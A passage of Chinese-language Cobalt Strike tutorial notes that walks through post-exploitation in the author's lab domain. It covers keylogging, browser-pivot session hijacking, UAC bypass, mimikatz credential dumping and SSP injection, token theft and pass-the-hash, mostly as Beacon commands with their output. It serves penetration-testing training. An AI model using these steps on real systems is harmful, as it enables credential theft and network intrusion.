- upload：上传一个文件到目标主机上。
- timestomp：将一个文件的修改属性访问属性和创建时间数据与另一个文件相匹配。当上传一个文件时，有时会想改变此文件的时间戳来使其混入同一文件夹下的其他文件中，使用timestomp 命令就可以完成此工作。

### 用户驱动溢出攻击

Beacon 运行任务的方式是以jobs去运行的，比如键盘记录、PowerShell 脚本、端口扫描等，这些任务都是在 beacon check in 之间于后台运行的。

- jobs：查看当前 Beacon 中的任务
- jobkill：加上任务 ID，对指定任务进行停止

**屏幕截图**

- screenshot：获取屏幕截图，使用screenshot pid来将截屏工具注入到一个 x86 的进程中，使用screenshot pid x64注入到一个 x64 进程中，explorer.exe 是一个好的候选程序。 使用screenshot [pid] [x86|x64] [time]来请求截屏工具运行指定的秒数，并在每一次 Beacon 连接到团队服务器的时候报告一张屏幕截图，这是查看用户桌面的一种简便方法。要查看截屏的具体信息，通过View --> Screenshots来浏览从所有 Beacon 会话中获取的截屏。

**键盘记录**

- keylogger：键盘记录器，使用keylogger pid来注入一个 x86 程序。使用keylogger pid x64来注入一个 x64 程序，explorer.exe 是一个好的候选程序。 使用单独的 keylogger 命令来将键盘记录器注入一个临时程序。键盘记录器会监视从被注入的程序中的键盘记录并将结果报告给 Beacon，直到程序终止或者自己杀死了这个键盘记录后渗透任务。要查看键盘记录的结果，可以到View --> Keystrokes中进行查看。

**其他**
除了上述使用命令的方式进行屏幕截图和键盘记录，也可以来到Explore --> Process List下选择要注入的进程，再直接点击屏幕截图或键盘记录的功能按钮。
从使用上，具体注入那个程序都是可以的，只是注入 explorer.exe 会比较稳定与持久。值得注意的是，多个键盘记录器可能相互冲突，每个桌面会话只应使用一个键盘记录器。

### 浏览器转发

浏览器转发是指在已经攻击成功的目标中，利用目标的信息登录网站进行会话劫持，但是目前只支持目标正在使用IE浏览器的前提下。关于如何判断当前用户是否使用IE浏览器，则可以通过屏幕截图来判断。

![image-20240628162447385](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162447385.png)

找到目前正在使用IE浏览器的目标后，右击该会话，选择Explore --> Browser Pivot，随后选择要注入的进程，CS 会在它认为可以注入的进程右边显示一个对勾，设置好端口后，点击运行即可。
此时，在浏览器中配置代理，代理配置为http代理，IP为CS团队服务器IP，端口为刚设置的端口。
代理配置好后，在浏览器中打开目标当前正在打开的网址，即可绕过登录界面。

### 端口扫描

- portscan：进行端口扫描，使用参数为：portscan [targets] [ports] [discovery method]。 目标发现discovery method有三种方法，分别是：arp、icmp、none，arp方法使用 ARP 请求来发现一个主机是否存活。icmp方法发送一个 ICMP echo 请求来检查一个目标是否存活。none选项让端口扫描工具假设所有的主机都是存活的。

端口扫描会在 Beacon 和团队服务器通讯的这个过程中不停运行。当它有可以报告的结果，它会把结果发送到 Beacon 控制台。Cobalt Strike 会处理这个信息并使用发现的主机更新目标模型。

![image-20240628162452316](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162452316.png)

右击 Beacon会话，在Explore --> Port Scan中即可打开端口扫描的图形窗口，CS会自动填充扫描地址，确认扫描地址、端口、扫描方式等无误后，开始扫描即可。扫描结束后，在 target table页面中可看到扫描结果，右击会话，选择 Services 可查看详细的扫描结果。

![image-20240628162456136](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162456136.png)

## 提权

当某些操作需要管理员权限，而当前用户权限只有一般用户权限时，就需要提权操作了。在 CS 中有以下几种提权操作：
bypassuac：将本地中级管理员权限提升至本地高级管理员权限，适用于Win 7 及以上的系统。
elevate：将任意用户的权限提升至系统权限，适用于2018年11月更新之前的 Win 7 和 Win 10 系统。
getsystem：将本地高级管理员权限提升至系统权限。
runas：使用其他用户的凭证来以其他用户身份运行一个命令，该命令不会返回任何输出。
spawnas：使用其他用户的凭证来以其他用户身份派生一个会话，这个命令派生一个临时的进程并将 payload stage 注入进那个进程。

### 用户账户控制

自 Windows vista 开始，Windows 系统引进了用户账户控制机制，即 UACUser Account Control机制，UAC 机制在 Win 7中得到了完善。UAC 与 UNIX 中的 sudo 工作机制十分相似，平时用户以普通权限工作，当用户需要执行特权操作时，系统会询问他们是否要提升权限。
此时系统用户可分为以下三种等级：
高：管理员权限
中：一般用户权限
低：受限制的权限
使用whoami /groups命令可以看到当前用户所在的组以及权限，使用net localgroup administrators可以查看当前在管理员组里的用户名。

### Spawn As

首先，右击待提权的会话，选择Access --> Spawn As，输入目标系统用户身份信息，其中域信息填写一个“点”代表本地用户，监听器这里选择的 SMB 监听器，之后点击运行就能看到对应的用户上线了。

![image-20240628162501113](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162501113.png)

### Bypass UAC

Bypass UAC 有两个步骤，分别是：
1、利用 UAC 漏洞来获取一个特权文件副本
2、使用 DLL 劫持进行代码执行
首先使用shell whoami /groups查看当前上线主机用户的所属组及 UAC 等级

![image-20240628162505210](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162505210.png)

![image-20240628162509105](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162509105.png)

待 Beacon Check in 后，当前用户 UAC 为高权限的会话便会上线了。

![image-20240628162512632](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162512632.png)

### PowerUp

PowerUp 所做的事是寻找可能存在弱点的地方，从而帮助提权。
利用 PowerUp 进行提权需要首先导入 ps1 文件powershell-import PowerUp.ps1，再执行powershell Invoke-AllChecks命令，使用 PowerUp 脚本可以快速的帮助我们发现系统弱点，从而实现提权的目的。
PowerUp 所做的事是寻找可能存在弱点的地方，从而帮助提权。
利用 PowerUp 进行提权需要首先导入 ps1 文件powershell-import PowerUp.ps1，再执行powershell Invoke-AllChecks命令，使用 PowerUp 脚本可以快速的帮助我们发现系统弱点，从而实现提权的目的。
其中PowerUp.ps1文件可从这里下载：
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
**PowerUp 的使用**
执行以下命令：将 ps1 文件上传到目标主机，并执行所有弱点检查。

```
powershell-import PowerUp.ps1
powershell invoke-allchecks
```

详细运行过程：

```
beacon> powershell-import PowerUp.ps1
[*] Tasked beacon to import: PowerUp.ps1
[+] host called home, sent: 275084 bytes
 
beacon> powershell invoke-allchecks
[*] Tasked beacon to run: invoke-allchecks
[+] host called home, sent: 313 bytes
[+] received output:
[*] Running Invoke-AllChecks
[+] Current user already has local administrative privileges!
[*] Checking for unquoted service paths...
 
[*] Checking service executable and argument permissions...
[+] received output:
ServiceName                     : AeLookupSvc
Path                            : C:\Windows\system32\svchost.exe -k netsvcs
ModifiableFile                  : C:\Windows\system32
ModifiableFilePermissions       : GenericAll
ModifiableFileIdentityReference : BUILTIN\Administrators
StartName                       : localSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AeLookupSvc'
CanRestart                      : True
……内容太多，此处省略……
 
[*] Checking service permissions...
[+] received output:
ServiceName   : AeLookupSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs
StartName     : localSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AeLookupSvc'
CanRestart    : True
……内容太多，此处省略……
 
[*] Checking %PATH% for potentially hijackable DLL locations...
[+] received output:
Permissions       : GenericAll
ModifiablePath    : C:\Windows\system32\WindowsPowerShell\v1.0\
IdentityReference : BUILTIN\Administrators
%PATH%            : %SystemRoot%\system32\WindowsPowerShell\v1.0\
AbuseFunction     : Write-HijackDll -DllPath 'C:\Windows\system32\WindowsPowerS
                    hell\v1.0\\wlbsctrl.dll'
……内容太多，此处省略……
 
[*] Checking for AlwaysInstallElevated registry key...
[*] Checking for Autologon credentials in registry...
 
[*] Checking for modifidable registry autoruns and configs...
[+] received output:
Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VMware Use
                 r Process
Path           : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files
                 \VMware\VMware Tools\vmtoolsd.exe; IdentityReference=BUILTIN\A
                 dministrators}
……内容太多，此处省略……
 
[*] Checking for modifiable schtask files/configs...
[+] received output:
TaskName     : GoogleUpdateTaskMachineCore
TaskFilePath : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files (
               x86)\Google\Update\GoogleUpdate.exe; IdentityReference=BUILTIN\A
               dministrators}
TaskTrigger  : <Triggers xmlns="http://schemas.microsoft.com/windows/2004/02/mi
               t/task"><LogonTrigger><Enabled>true</Enabled></LogonTrigger><Cal
               endarTrigger><StartBoundary>2020-04-11T21:47:44</StartBoundary><
               ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay></Ca
               lendarTrigger></Triggers>
……内容太多，此处省略……
 
[*] Checking for unattended install files...
UnattendPath : C:\Windows\Panther\Unattend.xml
 
[*] Checking for encrypted web.config strings...
[*] Checking for encrypted application pool and virtual directory passwords...
[*] Checking for plaintext passwords in McAfee SiteList.xml files....
[+] received output:
[*] Checking for cached Group Policy Preferences .xml files....
[+] received output:
```

如果在自己的靶机上发现导入ps1文件失败，这可能是因为系统不允许执行不信任的脚本文件导致的。
这时为了复现成功可以来到靶机下，以管理员权限打开 Powershell，运行set-ExecutionPolicy RemoteSigned，输入Y回车，此时系统便能导入PowerUp.ps1文件了。

```
PS C:\WINDOWS\system32> set-ExecutionPolicy RemoteSigned
执行策略更改
执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170
中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?
[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): Y
PS C:\WINDOWS\system32>
```

在运行Invoke-AllChecks后，便会列出当前系统中可被提权的弱点之处，之后再执行检查结果中AbuseFunction下的命令便能开始提权操作了。
但是我在自己本地环境中并未复现成功，执行AbuseFunction后的命令只能创建一个与当前登录用户相同权限的账户，没能达到提权的目的。

### 凭证和哈希获取

想要获取凭证信息，可以在管理员权限的会话处右击选择Access --> Dump Hashes，或者在控制台中使用hashdump命令。

![image-20240628162519209](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162519209.png)

想获取当前用户的密码，可以运行mimikatz，右击管理员权限会话选择Access --> Run Mimikatz，或在控制台运行logonpasswords命令。

![image-20240628162524371](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162524371.png)

在View --> Credentials下可以查看到hashdump与mimikatz获取的数据。

![image-20240628162527854](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162527854.png)

### Beacon 中的 Mimikatz

在 Beacon 中集成了 mimikatz ，mimikatz 执行命令有三种形式：

- mimikatz [module::command] <args> 运行 mimikatz 命令
- mimikatz [!module::command] <args> 强制提升到 SYSTEM 权限再运行命令，因为一些命令只有在 SYSTEM 身份下才能被运行。
- mimikatz [@module::command] <args> 使用当前 Beacon 的访问令牌运行 mimikatz 命令

下面是一些mimikatz命令。

- !lsadump::cache 获取缓存凭证，默认情况下 Windows 会缓存最近10个密码哈希
- !lsadump::sam 获取本地账户密码哈希，该命令与 hashdump 比较类似
- misc::cmd 如果注册表中禁用了 CMD ，就重新启用它
- !misc::memssp 注入恶意的 Windows SSP 来记录本地身份验证凭据，这个凭证存储在“C:\windows\system32\mimilsa.log”中
- misc::skeleton 该命令仅限域内使用。该命令会给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用,其原理是对 lsass.exe 进行注入，重启后会失效。
- process::suspend [pid] 挂起某个进程，但是不结束它
- process::resume [pid] 恢复挂起的进程

以上的这些只是mimikatz能做事情的一小部分，下面看看!misc::memssp的使用。

```
mimikatz !misc::memssp
cd C:\Windows\system32
shell dir mimilsa.log
shell type mimilsa.log
```

详细运行过程：
首先运行mimikatz !misc::memssp

```
beacon> mimikatz !misc::memssp
[*] Tasked beacon to run mimikatz's !misc::memssp command
[+] host called home, sent: 1006151 bytes
[+] received output:
Injected =)
```

接下来来到C:\Windows\system32目录

```
beacon> cd C:\Windows\system32
[*] cd C:\Windows\system32
[+] host called home, sent: 27 bytes
 
beacon> shell dir mimilsa.log
[*] Tasked beacon to run: dir mimilsa.log
[+] host called home, sent: 46 bytes
[+] received output:
 驱动器 C 中的卷没有标签。
 卷的序列号是 BE29-9C84
 
 C:\Windows\system32 的目录
 
2020/07/23  21:47                24 mimilsa.log
               1 个文件             24 字节
               0 个目录 17,394,728,960 可用字节
```

可以看到是存在mimilsa.log文件的，此时待目标主机重新登录，比如电脑锁屏后用户进行登录。
查看mimilsa.log文件内容。

```
beacon> shell type mimilsa.log
[*] Tasked beacon to run: type mimilsa.log
[+] host called home, sent: 47 bytes
[+] received output:
[00000000:000003e5] \    
[00000000:002b99a7] WIN-75F8PRJM4TP\Administrator    Password123!
```

成功获取到当前登录用户的明文密码。

## 横向扩展

### 主机和用户枚举

#### 主机枚举
**一些问题**
当进入目标局域网时，需要弄清楚几个问题。
1、我正处在那个域上？
2、域信任关系是什么样的？
3、可以登陆哪些域？这些域上有哪些系统？目标是什么？可以获取什么？
4、系统上存放共享数据的地方在哪里？
**一些枚举的命令**

- net view /domain枚举出当前域

```powershell
PS C:\> net view /domain
Domain
-------------------------
TEST
命令成功完成。
```

- net view /domain:[domain]、net group "domain computers" /domainnet view /domain:[domain]枚举域上一个主机的列表，但不是所有主机，这个也就是在网上邻居中可以看到的内容。net group "domain computers" /domain可以获得加入到这个域中的电脑账户列表。

```powershell
PS C:\> net view /domain:test
服务器名称            注解
----------------------------------
\\WIN-72A8ERDSF2P
\\WIN-P2AASSD1AF1
命令成功完成。

PS C:\> net group "domain computers" /domain
组名     Domain Computers
注释     加入到域中的所有工作站和服务器
成员
----------------------------------------------
WIN-72A8ERDSF2P$
命令成功完成。
```

- nltest /dclist:[domain]如果想找到那个主机是域的域控服务器，可以使用nltest命令

```powershell
PS C:\> nltest /dclist:teamssix
获得域“teamssix”中 DC 的列表(从“\\WIN-P2AASSD1AF1”中)。
    WIN-P2AASSD1AF1.teamssix.com [PDC]  [DS] 站点: Default-First-Site-Name
此命令成功完成
```

当使用 32 位的 payload 运行在 64 位的系统上，并且 nltest 路径不对的时候，可能会提示没有 nltest 这个命令，这时可以尝试使用下面的命令为其指定路径。

```powershell
PS C:\> C:\windows\sysnative\nltest /dclist:teamssix
获得域“teamssix”中 DC 的列表(从“\\WIN-P2AASSD1AF1”中)。
    WIN-P2AASSD1AF1.teamssix.com [PDC]  [DS] 站点: Default-First-Site-Name
此命令成功完成
```

- nslookup [name]、ping -n 1 -4 [name]有时在 Cobalt Strike 里，我们只需要使用目标的 NetBIOS 名称，而不用在意使用 IPv4 地址或者 IPv6 地址，NetBIOS 名称是在域上每台机器的完整名称。但是如果想通过一个 IPv4 地址转换为一个 NetBIOS 名称，可以使用 nslookup 命令，或者使用 ping 发送一个包来获得主机返回的 IP 地址。

```powershell
PS C:\> nslookup WIN-P2AASSD1AF1
服务器:  UnKnown
Address:  ::1
名称:    WIN-P2AASSD1AF1.teamssix.com
Address:  192.168.15.124

PS C:\> ping -n 1 -4 WIN-P2AASSD1AF1
正在 Ping WIN-P2AASSD1AF1.teamssix.com [192.168.15.124] 具有 32 字节的数据:
来自 192.168.15.124 的回复: 字节=32 时间<1ms TTL=128
192.168.15.124 的 Ping 统计信息:
    数据包: 已发送 = 1，已接收 = 1，丢失 = 0 (0% 丢失)，
往返行程的估计时间(以毫秒为单位):
    最短 = 0ms，最长 = 0ms，平均 = 0ms
```

- nltest /domain_trusts、nltest /server:[address] /domain_trusts如果想取得域上的信任关系，可以使用 nltest 命令来实现。

```powershell
PS C:\> nltest /domain_trusts
域信任的列表:
    0: TEAMSSIX teamssix.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)
此命令成功完成

PS C:\> nltest /server:192.168.15.124 /domain_trusts
域信任的列表:
    0: TEAMSSIX teamssix.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)
此命令成功完成
```

- net view \\[name]如果想列出主机上的共享列表，只需输入net view \\[name]即可

```powershell
PS C:\> net view \\WIN-P2AASSD1AF1
在 \\WIN-75F8PRJM4TP 的共享资源
共享名  类型  使用为  注释
----------------------------------
Users   Disk
命令成功完成。
```

#### Net 模块
Cobalt Strike 中有自己的 net 模块，net 模块是 beacon 后渗透攻击模块，它通过 windows 的网络管理 api 函数来执行命令，想使用 net 命令，只需要在 beacon 的控制中心输入 net + 要执行的命令即可。

```powershell
net dclist : 列出当前域的域控制器
net dclist [DOMAIN] : 列出指定域的域控制器
net share \\[name] : 列出目标的共享列表
net view : 列出当前域的主机
net view [DOMAIN] : 列出指定域的主机
```

在 beacon 控制台中输入这些命令很类似输入一个本地的 net 命令，但是有一些些许的不同，比如下面一个是在主机上运行 net view 的结果一个是在 beacon 控制台下运行 net view 的结果。不难看出，beacon 下输出的结果更为丰富。

```powershell
PS C:\> net view
服务器名称            注解
-------------------------------------------
\\WIN-P2AASSD1AF1
命令成功完成。
```

```powershell
beacon> net view
[*] Tasked beacon to run net view
[+] host called home, sent: 104504 bytes
[+] received output:
List of hosts:
Server Name             IP Address                       Platform  Version  Type   Comment
-----------             ----------                       --------  -------  ----   -------
WIN-P2AASSD1AF1         192.168.15.124                   500       6.1      PDC
```
![image-20240628162540760](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162540760.png)

### 用户枚举
用户枚举的三个关键步骤：
1、当前账号是否为管理员账号？
2、哪些账号是域管理员账号？
3、哪个账号是这个系统上的本地管理员账号？
#### 管理员账号
第一个关键步骤，发现管理员账号。
如果想知道自己是否为管理员账号，可以尝试运行一些只有管理员账号才有权限操作的命令，然后通过返回结果判断是否为管理员。
其中一种方式是尝试列出仅仅只有管理员才能查看的共享列表，比如下面的 dir \\host\C$ 命令，如果可以看到一个文件列表，那么说明可能拥有本地管理员权限。


```powershell
shell dir \\host\C$
```

```powershell
#管理员账号运行结果
beacon> shell dir \\WinDC\C$
[*] Tasked beacon to run: dir \\WinDC\C$
[+] host called home, sent: 55 bytes
[+] received output:
 驱动器 \\WinDC\C$ 中的卷没有标签。
 卷的序列号是 F269-89A7
 \\WinDC\C$ 的目录
2020/06/24  09:29    <DIR>          inetpub
2009/07/14  11:20    <DIR>          PerfLogs
2020/07/16  21:24    <DIR>          Program Files
2020/07/16  21:52    <DIR>          Program Files (x86)
2020/07/17  23:00    <DIR>          Users
2020/07/26  00:55    <DIR>          Windows
               0 个文件              0 字节
               6 个目录 28,500,807,680 可用字节
```

```powershell
#一般账号运行结果
beacon> shell dir \\WinDC\C$
[*] Tasked beacon to run: dir \\WinDC\C$
[+] host called home, sent: 55 bytes
[+] received output:
拒绝访问。
```

也可以运行其他命令，比如运行下面的 at 命令来查看系统上的计划任务列表，如果显示出了任务列表信息，那么可能是本地管理员。（当任务列表没有信息时会返回 “列表是空的” 提示）

```powershell
shell at \\host
```

```powershell
#管理员账号运行结果
beacon> shell at \\WinDC
[*] Tasked beacon to run: at \\WinDC
[+] host called home, sent: 51 bytes
[+] received output:
状态 ID     日期                    时间          命令行
-------------------------------------------------------------------------------
        1   今天                    22:30         E:\Install\Thunder\Thunder.exe
```

```powershell
#一般账号运行结果
beacon> shell at \\WinDC
[*] Tasked beacon to run: at \\WinDC
[+] host called home, sent: 51 bytes
[+] received output:
拒绝访问。
```

在上一节讲述的 PowerView 有很多很好的自动操作来帮助解决这些问题。可以在加载 PowerView 后，运行下面的命令，通过 PowerView 可以快速找到管理员账号。

```powershell
powershell Find-LocalAdminAccess
```


```powershell
beacon> powershell-import powerview.ps1
[*] Tasked beacon to import: powerview.ps1
[+] host called home, sent: 101224 bytes

beacon> powershell Find-LocalAdminAccess
[*] Tasked beacon to run: Find-LocalAdminAccess
[+] host called home, sent: 329 bytes
[+] received output:
WinDC.teamssix.com
```

#### 域管理员账号
第二个关键步骤，发现域管理员账号。
**列出域管理员**
对于发现域管理员账号，可以在共享里使用本地的Windows命令。运行以下两条命令可以用来找出这些“域群组”的成员。

```powershell
net group "enterprise admins" /DOMAIN
net group "domain admins" /DOMAIN
```
```powershell
beacon> shell net group "enterprise admins" /domain
[*] Tasked beacon to run: net group "enterprise admins" /domain
[+] host called home, sent: 68 bytes
[+] received output:
组名     Enterprise Admins
注释     企业的指定系统管理员
成员
-------------------------------------------------------------------------------
Administrator            
命令成功完成。
```

```powershell
beacon> shell net group "domain admins" /domain
[*] Tasked beacon to run: net group "domain admins" /domain
[+] host called home, sent: 64 bytes
[+] received output:
组名     Domain Admins
注释     指定的域管理员
成员
-------------------------------------------------------------------------------
Administrator            
命令成功完成。
```
或者运行下面的命令来看谁是域控制器上的管理员
```powershell
net localgroup "administrators" /DOMAIN
```
```powershell
beacon> shell net localgroup "administrators" /domain
[*] Tasked beacon to run: net localgroup "administrators" /domain
[+] host called home, sent: 70 bytes
[+] received output:
别名     administrators
注释     管理员对计算机/域有不受限制的完全访问权
成员
-------------------------------------------------------------------------------
administrator
Domain Admins
Daniel
Enterprise Admins
命令成功完成。
```

**Net 模块**
beacon 的 net 模块也可以帮助我们，下面的命令中 TARGET 的意思是一个域控制器或者是任何想查看的组名，比如企业管理员、域管理员等等
```powershell
net group \\TARGET group name
```
也可以运行下面的命令，这会连接任意目标来获取列表
```powershell
net localgroup \\TARGET group name
```

#### 本地管理员
**Net 模块**
本地管理员可能是一个域账户，因此如果想把一个系统作为目标，应该找到谁是这个系统的本地管理员，因为如果获得了它的密码哈希值或者凭据就可以伪装成那个用户。
beacon 的 net 模块可以在系统上从一个没有特权的关联中查询本地组和用户。
在 beacon 控制台中运行下面命令可以获得一个目标上的群组列表
```powershell
net localgroup \\TARGET
```

如果想获取群组的列表，可运行下面的命令来获得一个群组成员的名单列表。

```powershell
net localgroup \\TARGET group name
```

```powershell
beacon> net localgroup \\WinDC administrators
[*] Tasked beacon to run net localgroup administrators on WinDC
[+] host called home, sent: 104510 bytes
[+] received output:
Members of administrators on \\WinDC:
TEAMSSIX\Administrator
TEAMSSIX\Daniel
TEAMSSIX\Enterprise Admins
TEAMSSIX\Domain Admins
```

### 获取信任

如果当前账号权限被系统认为是本地管理员权限，那么就可以执行很多管理员才能做的事，接下来就来看一下这样的一个过程是如何工作的，其中会涉及到以下要点：
1、Access Token 登录令牌
2、Credentials 凭证
3、Password Hashes 密码哈希
4、Kerberos Tickets 登录凭据

#### 登录令牌

- 登录令牌在登录之后被创建
- 与每个进程和线程相关联
- 包括：
   - 用户和用户组的信息
   - 本地计算机上的特权列表
   - 限制（删除用户和用户组的权限）
   - 参考凭证（支持单点登录）
- 一直保存在内存中，直到系统重启

_以下是令牌窃取的过程：_

- 使用 ps 列出进程
- 使用 steal_token [pid] 窃取令牌
- 使用 getuid 找到你是谁
- 使用 rev2self 移除令牌

接下来将对这些命令进行演示，目前有一个 SYSTEM 权限的会话，该会话在 WIN-72A8ERDSF2P 主机下，此时想查看 WIN-P2AASSD1AF1 主机下的文件（WIN-P2AASSD1AF1 主机是 TEAMSSIX 域的域控制器），那么直接运行 dir 会提示拒绝访问。

```powershell
beacon> shell dir \\WIN-P2AASSD1AF1\C$
[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$
[+] host called home, sent: 55 bytes
[+] received output:
拒绝访问。
```

此时，先用 ps 查看一下当前系统进程信息。

```powershell
beacon> ps
[*] Tasked beacon to list processes
[+] host called home, sent: 12 bytes
[*] Process List
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 0     0     [System Process]                               
 4     0     System                       x64   0           NT AUTHORITY\SYSTEM
……内容太多，此处省略……
 3720  524   taskhost.exe                 x64   2           WIN-72A8ERDSF2P\Administrator
 4092  236   dwm.exe                      x64   3           TEAMSSIX\Administrator
```

通过进程信息可以发现 TEAMSSIX 域下的管理员账户此时在当前 SYSTEM 会话的主机上是登录着的，使用 steal_token [pid] 命令窃取 TEAMSSIX\Administrator 账户的令牌

```powershell
beacon> steal_token 4092
[*] Tasked beacon to steal token from PID 4092
[+] host called home, sent: 12 bytes
[+] Impersonated TEAMSSIX\administrator
```

查看一下当前会话 uid

```powershell
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are TEAMSSIX\administrator (admin)
```

再次尝试获取域控制器主机下的文件

```powershell
beacon> shell dir \\WIN-P2AASSD1AF1\C$
[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$
[+] host called home, sent: 55 bytes
[+] received output:
 驱动器 \\WIN-P2AASSD1AF1\C$ 中的卷没有标签。
 卷的序列号是 F269-89A7
 \\WIN-P2AASSD1AF1\C$ 的目录
2020/07/16  21:24    <DIR>          Program Files
2020/07/16  21:52    <DIR>          Program Files (x86)
2020/07/17  23:00    <DIR>          Users
2020/07/26  00:55    <DIR>          Windows
               0 个文件      0 字节
               4 个目录 28,493,299,712 可用字节
```


发现可以成功访问了，使用 rev2self 可移除当前窃取的令牌

```powershell
beacon> rev2self
[*] Tasked beacon to revert token
[+] host called home, sent: 8 bytes
```

再次查看 uid 发现变成了原来的 SYSTEM 权限，此时 WIN-P2AASSD1AF1 主机上的文件也拒绝访问了。

```powershell
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> shell dir \\WIN-P2AASSD1AF1\C$
[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$
[+] host called home, sent: 55 bytes
[+] received output:
拒绝访问。
```

#### 凭证

1、使用 make_token 创建一个令牌

```powershell
make_token DOMAIN\user password
```

在运行命令之前，需要知道要获取令牌用户的密码，这里可以使用 mimikatz 进行获取，具体的方法可参考[《CS学习笔记 | 14、powerup提权的方法》](https://teamssix.com/year/200419-150600.html)这一节中的介绍。
这里还是和上文一样的环境，在一个 SYSTEM 会话下，获取 TEAMSSIX\administrator 账号令牌，使用 mimikatz 可以得知 TEAMSSIX\administrator 账号密码为 Test111!，接下来使用 make_token 命令。

```powershell
beacon> make_token TEAMSSIX\administrator Test111!
[*] Tasked beacon to create a token for TEAMSSIX\administrator
[+] host called home, sent: 53 bytes
[+] Impersonated NT AUTHORITY\SYSTEM

beacon> shell dir \\WIN-P2AASSD1AF1\C$
[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$
[+] host called home, sent: 55 bytes
[+] received output:
 驱动器 \\WIN-P2AASSD1AF1\C$ 中的卷没有标签。
 卷的序列号是 F269-89A7
 \\WIN-P2AASSD1AF1\C$ 的目录
2020/07/16  21:24    <DIR>          Program Files
2020/07/16  21:52    <DIR>          Program Files (x86)
2020/07/17  23:00    <DIR>          Users
2020/07/26  00:55    <DIR>          Windows
               0 个文件      0 字节
               4 个目录 28,493,299,712 可用字节
               
beacon> powershell Invoke-Command -computer WIN-P2AASSD1AF1 -ScriptBlock {whoami}
[*] Tasked beacon to run: Invoke-Command -computer WIN-P2AASSD1AF1 -ScriptBlock {whoami}
[+] host called home, sent: 231 bytes
[+] received output:
teamssix\administrator
```

当密码输入错误时，执行上面的两个命令就会提示 登录失败: 未知的用户名或错误密码。 同样的使用 rev2self 可除去当前令牌，恢复原来的 SYSTEM 权限。
2、使用 spawn beacon 替代凭证

```powershell
spawnas DOMAIN\user password
```

3、在目标上建立账户

```powershell
net use \\host\C$/USER:DOMAIN\user password
```

这两种方法，在之前的笔记中都或多或少的提及过，这里不再过多赘述。

#### 密码哈希

使用 mimikatz 获取密码哈希

```
pth DOMAIN\user ntlmhash
```

如何工作的？
1、mimikatz 使用登录令牌开启了一个进程，在单点登录信息那里填入我们提供的用户名称、域、密码哈希值
2、cobalt strike 自动的从那个进程中窃取令牌并关闭
首先使用 hashdump 获取用户的密码哈希值，这里的 beacon 会话为 SYSTEM 权限。

```powershell
beacon> hashdump
[*] Tasked beacon to dump hashes
[+] host called home, sent: 82501 bytes
[+] received password hashes:
Administrator:500:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::
Daniel:1000:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::
Guest:501:aca3b435b5z404eeaad3f435b51404he:31d6cfe0d16ae931b73c59d7e0c089c0:::
TeamsSix:1002:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::
```

使用 pth 获取信任

```powershell
beacon> pth TEAMSSIX\Administrator 12cb161bvca930994x00cbc0aczf06d1
[+] host called home, sent: 23 bytes
[*] Tasked beacon to run mimikatz's sekurlsa::pth /user:Administrator /domain:TEAMSSIX /ntlm:12cb161bvca930994x00cbc0aczf06d1 /run:"%COMSPEC% /c echo ade660d8dce > \\.\pipe\8d3e4c" command
[+] host called home, sent: 750600 bytes
[+] host called home, sent: 71 bytes
[+] Impersonated NT AUTHORITY\SYSTEM
[+] received output:
user	: Administrator
domain	: TEAMSSIX
program	: C:\Windows\system32\cmd.exe /c echo ade660d8dce > \\.\pipe\8d3e4c
impers.	: no
NTLM	: 12cb161bvca930994x00cbc0aczf06d1
  |  PID  2992
  |  TID  5028
  |  LSA Process is now R/W
  |  LUID 0 ; 14812112 (00000000:00e203d0)
  \_ msv1_0   - data copy @ 0000000001794E80 : OK !
  \_ kerberos - data copy @ 000000000044A188
   \_ aes256_hmac       -> null             
   \_ aes128_hmac       -> null             
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
